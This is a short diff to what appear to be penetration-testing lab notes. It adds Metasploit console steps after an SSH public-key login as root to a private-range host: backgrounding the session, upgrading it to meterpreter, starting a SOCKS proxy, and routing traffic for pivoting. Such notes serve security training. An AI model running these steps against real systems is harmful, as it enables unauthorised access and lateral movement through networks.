@@ -18,6 +18,12 @@ msf auxiliary(ssh_login_pubkey) > set RHOSTS 10.10.110.123
 msf auxiliary(ssh_login_pubkey) > set USERNAME root  
 msf auxiliary(ssh_login_pubkey) > set KEY_PATH 10.10.110.123/root_ssh  
 msf auxiliary(ssh_login_pubkey) > run  
+ctrl+z
+sessions -u 2
+background
+use auxiliary/server/socks_proxy
+run
+
 
 meterpreter > run post/multi/manage/autoroute  
 CTRL+Z  
